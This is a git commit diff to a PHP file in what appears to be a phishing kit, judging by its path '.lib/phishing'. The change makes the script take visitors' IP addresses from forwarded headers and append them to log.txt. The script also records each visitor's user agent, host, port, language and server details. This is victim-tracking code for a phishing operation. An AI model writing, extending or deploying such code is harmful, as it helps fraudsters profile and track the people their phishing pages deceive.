ba9ab0ff065a0e488c397320d417932093f0f381
aevx <85465830+aevx@users.noreply.github.com>
2022-07-10 03:43:19 +0300

    Add files via upload

--- .lib/phishing/sc/info/ip/ip.php
+++ .lib/phishing/sc/info/ip/ip.php
@@ -1,6 +1,21 @@
 <?php
 
-$ip = $_SERVER['REMOTE_ADDR'];
+function ips()
+	{
+		if (!empty($_SERVER['HTTP_CLIENT_IP']))
+		{
+			$ip	= $_SERVER['HTTP_CLIENT_IP'];
+		}
+		elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+			$ip	= $_SERVER['HTTP_X_FORWARDED_FOR'];
+		}
+		else{
+			$ip	= $_SERVER['REMOTE_ADDR'];
+		}
+		return $ip;
+	}
+
+$ip = ips();
 $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 $ipp = $_SERVER['HTTP_HOST'];
 $tarayici = $_SERVER['HTTP_USER_AGENT'];
@@ -11,6 +26,6 @@ $istk = $_SERVER['REQUEST_METHOD'];
 $port = $_SERVER['REMOTE_PORT'];
 $sdil = $_SERVER['SERVER_SOFTWARE'];
 
-$fp = fopen('log.txt', 'w+');
-fwrite($fp,'İp Adresi: '.$ip."\n\n".'Host: '.$host."\n\n".'İp Port: '.$ipp."\n\n".'User Agent: ' .$tarayici."\n\n".'Sayfa Dili: '.$dil."\n\n".'Sıkıştırma: '.$sikistirma."\n\n".'Protokol: '.$p."\n\n".'İstek: '.$istk."\n\n".'Port: '.$port."\n\n".'Server Dili: '.$sdil."\n\n");
+$fp = fopen('log.txt', 'a');
+fwrite($fp,"\n\n\n".'İp Adresi: '.$ip."\n\n".'Host: '.$host."\n\n".'İp Port: '.$ipp."\n\n".'User Agent: ' .$tarayici."\n\n".'Sayfa Dili: '.$dil."\n\n".'Sıkıştırma: '.$sikistirma."\n\n".'Protokol: '.$p."\n\n".'İstek: '.$istk."\n\n".'Port: '.$port."\n\n".'Server Dili: '.$sdil."\n\n\n");
 fclose($fp);
